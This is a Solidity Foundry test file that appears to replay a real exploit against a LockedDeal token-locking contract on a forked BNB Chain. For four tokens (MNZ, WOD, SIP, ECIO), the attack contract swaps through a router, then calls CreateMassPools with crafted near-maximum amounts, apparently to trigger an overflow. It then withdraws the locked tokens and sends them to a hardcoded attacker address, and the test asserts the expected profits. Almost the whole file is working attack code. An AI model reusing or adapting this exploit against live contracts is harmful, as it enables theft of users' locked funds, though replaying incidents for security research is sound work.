
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 26475403;
    uint256 constant TX_TIMESTAMP = 1678850162;
    uint256 constant TX_BLOCK_NUMBER = 26475404;
    uint256 constant TX_VALUE = 400000000000000;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        _runExploit();
    }

    function _runExploit() internal {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack;
        if (ATTACK_CONTRACT != address(0)) {
            _installRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
        _expectOutcome(address(attack), address(0));
        _snapProfit();
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _installRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(ATTACK_CONTRACT);
    }

    function _expectOutcome(address attack, address helper) internal {
        attack;
        helper;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.WOD, "WOD", 35975489757544978020353101);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.ECIO, "ECIO", 252153413174665343146142472);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.MNZ, "MNZ", 61856885947730825921957739);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.SIP, "SIP", 29032394845434095905131280);
    }
}

contract OurAttack {


    function attack() external payable {
        _attack();
    }

    function _attack() internal {
        {
            bytes memory replayCallData =
                hex"7ff36ab500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000000000000058bae36467a9fc5e1045dbdffc2fd65b91c220300000000000000000000000000000000000000000000000000000000641138720000000000000000000000000000000000000000000000000000000000000003000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c000000000000000000000000e9e7cea3dedca5984780bafc599bd69add087d56000000000000000000000000861f1e1397dad68289e8f6a09a2ebb567f1b895c";
            (bool ok,) = payable(Addresses.A_10ED43_024E).call{value: 100000000000000}(replayCallData);
            require(ok, "replay selector 0x7ff36ab5 failed");
        }
        IERC20Like(Addresses.MNZ).balanceOf(Addresses.LockedDeal);
        uint256 mnzApproveAllowance = type(uint256).max;
        IERC20Like(Addresses.MNZ).approve(Addresses.LockedDeal, mnzApproveAllowance);
        {
            uint64[] memory abiArg1 = new uint64[](2);
            abiArg1[0] = uint64(1678850162);
            abiArg1[1] = uint64(1678850162);
            ILockedDeal(Addresses.LockedDeal)
                .CreateMassPools(
                    Addresses.MNZ,
                    abiArg1,
                    _uintArray2(
                        0xffffffffffffffffffffffffffffffffffffffffffccd5504f7dc21147fe6031, 61856797091635905326850000
                    ),
                    _addressArray2(address(this), address(this))
                );
        }
        ILockedDeal(Addresses.LockedDeal).WithdrawToken(158971);
        uint256 mnzBalanceOfAttackAttackContract = IERC20Like(Addresses.MNZ).balanceOf(address(this));
        IERC20Like(Addresses.MNZ).transfer(Addresses.attacker_eoa, mnzBalanceOfAttackAttackContract);
        {
            bytes memory replayCallData =
                hex"7ff36ab500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000000000000058bae36467a9fc5e1045dbdffc2fd65b91c220300000000000000000000000000000000000000000000000000000000641138720000000000000000000000000000000000000000000000000000000000000002000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c000000000000000000000000298632d8ea20d321fab1c9b473df5dbda249b2b6";
            (bool ok,) = payable(Addresses.A_10ED43_024E).call{value: 100000000000000}(replayCallData);
            require(ok, "replay selector 0x7ff36ab5 failed");
        }
        IERC20Like(Addresses.WOD).balanceOf(Addresses.LockedDeal);
        uint256 wodApproveAllowance = type(uint256).max;
        IERC20Like(Addresses.WOD).approve(Addresses.LockedDeal, wodApproveAllowance);
        {
            uint64[] memory abiArg1 = new uint64[](2);
            abiArg1[0] = uint64(1678850162);
            abiArg1[1] = uint64(1678850162);
            ILockedDeal(Addresses.LockedDeal)
                .CreateMassPools(
                    Addresses.WOD,
                    abiArg1,
                    _uintArray2(
                        0xffffffffffffffffffffffffffffffffffffffffffe23de8f17f058a57af6851, 35975413186725149349550000
                    ),
                    _addressArray2(address(this), address(this))
                );
        }
        ILockedDeal(Addresses.LockedDeal).WithdrawToken(158973);
        uint256 wodBalanceOfAttackAttackContract = IERC20Like(Addresses.WOD).balanceOf(address(this));
        IERC20Like(Addresses.WOD).transfer(Addresses.attacker_eoa, wodBalanceOfAttackAttackContract);
        {
            bytes memory replayCallData =
                hex"7ff36ab500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000000000000058bae36467a9fc5e1045dbdffc2fd65b91c220300000000000000000000000000000000000000000000000000000000641138720000000000000000000000000000000000000000000000000000000000000003000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c000000000000000000000000e9e7cea3dedca5984780bafc599bd69add087d560000000000000000000000009e5965d28e8d44cae8f9b809396e0931f9df71ca";
            (bool ok,) = payable(Addresses.A_10ED43_024E).call{value: 100000000000000}(replayCallData);
            require(ok, "replay selector 0x7ff36ab5 failed");
        }
        IERC20Like(Addresses.SIP).balanceOf(Addresses.LockedDeal);
        uint256 sipApproveAllowance = type(uint256).max;
        IERC20Like(Addresses.SIP).approve(Addresses.LockedDeal, sipApproveAllowance);
        {
            uint64[] memory abiArg1 = new uint64[](2);
            abiArg1[0] = uint64(1678850162);
            abiArg1[1] = uint64(1678850162);
            ILockedDeal(Addresses.LockedDeal)
                .CreateMassPools(
                    Addresses.SIP,
                    abiArg1,
                    _uintArray2(
                        0xffffffffffffffffffffffffffffffffffffffffffe7fc2d2e69e4e2fc2ef001, 29032275688743400000000000
                    ),
                    _addressArray2(address(this), address(this))
                );
        }
        ILockedDeal(Addresses.LockedDeal).WithdrawToken(158975);
        uint256 sipBalanceOfAttackAttackContract = IERC20Like(Addresses.SIP).balanceOf(address(this));
        IERC20Like(Addresses.SIP).transfer(Addresses.attacker_eoa, sipBalanceOfAttackAttackContract);
        {
            bytes memory replayCallData =
                hex"7ff36ab500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000000000000058bae36467a9fc5e1045dbdffc2fd65b91c220300000000000000000000000000000000000000000000000000000000641138720000000000000000000000000000000000000000000000000000000000000003000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c000000000000000000000000e9e7cea3dedca5984780bafc599bd69add087d56000000000000000000000000327a3e880bf2674ee40b6f872be2050ed406b021";
            (bool ok,) = payable(Addresses.A_10ED43_024E).call{value: 100000000000000}(replayCallData);
            require(ok, "replay selector 0x7ff36ab5 failed");
        }
        IERC20Like(Addresses.ECIO).balanceOf(Addresses.LockedDeal);
        uint256 ecioApproveAllowance = type(uint256).max;
        IERC20Like(Addresses.ECIO).approve(Addresses.LockedDeal, ecioApproveAllowance);
        {
            uint64[] memory abiArg1 = new uint64[](2);
            abiArg1[0] = uint64(1678850162);
            abiArg1[1] = uint64(1678850162);
            ILockedDeal(Addresses.LockedDeal)
                .CreateMassPools(
                    Addresses.ECIO,
                    abiArg1,
                    _uintArray2(
                        0xffffffffffffffffffffffffffffffffffffffffff2f6cae1f3d1a36331bc641, 252152268734854541525400000
                    ),
                    _addressArray2(address(this), address(this))
                );
        }
        ILockedDeal(Addresses.LockedDeal).WithdrawToken(158977);
        uint256 ecioBalanceOfAttackAttackContract = IERC20Like(Addresses.ECIO).balanceOf(address(this));
        IERC20Like(Addresses.ECIO).transfer(Addresses.attacker_eoa, ecioBalanceOfAttackAttackContract);
    }

    receive() external payable {}

    fallback() external payable {
        if (msg.sig == 0x7762c172) {
            _attack();
            return;
        }
        _entryCb();
    }

    function _entryCb() internal {}

    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _recordBalancerFlash(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerFlashLoanPreBalances(address[] memory tokens) external {
        _recordBalancerFlash(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _addressArray2(address a0, address a1) internal pure returns (address[] memory out) {
        out = new address[](2);
        out[0] = a0;
        out[1] = a1;
    }

    function _uintArray2(uint256 a0, uint256 a1) internal pure returns (uint256[] memory out) {
        out = new uint256[](2);
        out[0] = a0;
        out[1] = a1;
    }
}

interface IERC20Like {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function transfer(address to, uint256 amount) external;
    function transferFrom(address from, address to, uint256 amount) external;
}

interface IWETHLike {
    function deposit() external payable;
}

library ArrayGuard {
    function capWithReserve(uint256 wanted, address token, address holder, uint256 reserve)
        internal
        view
        returns (uint256)
    {
        uint256 available = IERC20Like(token).balanceOf(holder);
        if (available > reserve) available -= reserve;
        else available = 0;
        return wanted > available ? available : wanted;
    }
}

interface IERC721Like {
    function ownerOf(uint256 tokenId) external view returns (address);
    function getApproved(uint256 tokenId) external view returns (address);
    function isApprovedForAll(address owner, address operator) external view returns (bool);
    function transferFrom(address from, address to, uint256 tokenId) external;
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
}

interface IUniswapV2PairLike {
    function mint(address to) external returns (uint256 liquidity);
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
    function skim(address to) external;
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IMulticallLike {
    function multicall(bytes[] calldata data) external returns (bytes[] memory results);
}

struct AttackCall {
    address target;
    bytes data;
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant Cake_LP = 0x054407D77a00514fDA4F27aec37b6D7F8EEb0656;
    address internal constant attack_contract = 0x058baE36467a9fc5e1045dBDfFc2fd65B91C2203;
    address internal constant A_10ED43_024E = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address internal constant attacker_eoa = 0x190Cd736F5825ff0Ae0141B5C9cb7Fcd042cef2a;
    address internal constant WOD = 0x298632D8EA20d321fAB1C9B473df5dBDA249B2b6;
    address internal constant ECIO = 0x327A3e880bF2674Ee40b6f872be2050Ed406b021;
    address internal constant Cake_LP_23BD = 0x3C096f6c3aD08F36822E75a8B1cF34849FE623bd;
    address internal constant Cake_LP_DC16 = 0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16;
    address internal constant MNZ = 0x861f1E1397daD68289e8f6a09a2ebb567f1B895C;
    address internal constant LockedDeal = 0x8BfAA473a899439d8E07BF86a8C6cE5De42fE54B;
    address internal constant SIP = 0x9e5965d28E8D44CAE8F9b809396E0931F9Df71CA;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address internal constant Cake_LP_B4F4 = 0xE157f7ceA13f352624133372a85A9E32d437B4f4;
    address internal constant Cake_LP_57AF = 0xe948E8BC62eE35D06a015199954C6C2A99E157Af;
    address internal constant BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
}

interface ILockedDeal {
    function CreateMassPools(address, uint64[] calldata, uint256[] calldata, address[] calldata) external;
    function WithdrawToken(uint256) external returns (uint256);
}
